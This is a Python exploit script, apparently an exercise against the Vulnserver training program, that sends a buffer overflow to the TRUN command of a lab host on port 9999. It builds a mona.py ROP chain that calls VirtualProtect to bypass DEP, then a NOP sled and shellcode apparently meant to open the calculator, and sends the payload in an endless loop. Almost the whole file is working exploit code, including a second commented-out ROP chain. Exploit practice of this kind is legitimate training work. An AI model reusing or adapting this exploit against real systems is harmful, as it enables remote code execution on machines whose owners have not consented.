import socket
import struct
import sys

from utils import shellcode2, shellcode_calc, shellcode_calc2


def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        # [---INFO:gadgets_to_set_esi:---]
        0x75623ba1,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        0x752efd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_ebp:---]
        0x7563d676,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x625011af,  # & jmp esp [essfunc.dll]
        # [---INFO:gadgets_to_set_ebx:---]
        0x755b1793,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x74db37c6,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
        0x752ef9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_edx:---]
        0x77232af6,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x74db2f3a,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
        0x758a3d05,  # XCHG EAX,EDX # ADC ESP,EDI # DEC ECX # RETN 0x0C [GDI32.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_ecx:---]
        0x77276b24,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x6250491a,  # &Writable location [essfunc.dll]
        # [---INFO:gadgets_to_set_edi:---]
        0x75337bd5,  # POP EDI # RETN [MSCTF.dll] ** REBASED ** ASLR
        0x74e1ad68,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_eax:---]
        0x755b1734,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
        0x90909090,  # nop
        # [---INFO:pushad:---]
        0x7524b030,  # PUSHAD # RETN [user32.dll] ** REBASED ** ASLR
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)


rop_chain = create_rop_chain()


# def create_rop_chain():
# # rop chain generated with mona.py - www.corelan.be
#     rop_gadgets = [
#     #[---INFO:gadgets_to_set_esi:---]
#     0x777b3cdf, # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
#     0x6250609c, # ptr to &VirtualProtect() [IAT essfunc.dll]
#     0x776bfd52, # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] **
#     #[---INFO:gadgets_to_set_ebp:---]
#     0x7766a07e, # POP EBP # RETN [RPCRT4.dll] ** REBASED ** ASLR
#     0x625011af, # & jmp esp [essfunc.dll]
#     #[---INFO:gadgets_to_set_ebx:---]
#     0x777d42f9, # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
#     0xfffffdff, # Value to negate, will become 0x00000201
#     0x7767dae9, # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
#     0x776bf9f1, # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR
#     #[---INFO:gadgets_to_set_edx:---]
#     0x779b784c, # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
#     0xffffffc0, # Value to negate, will become 0x00000040
#     0x765f3193, # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR
#     0x75da1110, # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
#     #[---INFO:gadgets_to_set_ecx:---]
#     0x777c7618, # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
#     0x75142085, # &Writable location [wshtcpip.dll] ** REBASED ** ASLR
#     #[---INFO:gadgets_to_set_edi:---]
#     0x77b220f1, # POP EDI # RETN [USP10.dll] ** REBASED ** ASLR
#     0x77611645, # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
#     #[---INFO:gadgets_to_set_eax:---]
#     0x777eaaca, # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
#     0x90909090, # nop
#     #[---INFO:pushad:---]
#     0x779407f0, # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR
#     ]
#     return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
# rop_chain = create_rop_chain()



buffer = b"A"*2004 + rop_chain +b"\x90"*16 +shellcode_calc+b"C"*(5004-2004-len(rop_chain)-16- len(shellcode_calc))
#
# buffer = b"A"*2003 +b"BBBB"+b"C"*(5000)

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect(('192.168.58.140', 9999))
        s.send(b'TRUN .:/' + buffer)
        s.recv(1024)
        s.close()
    except:
        pass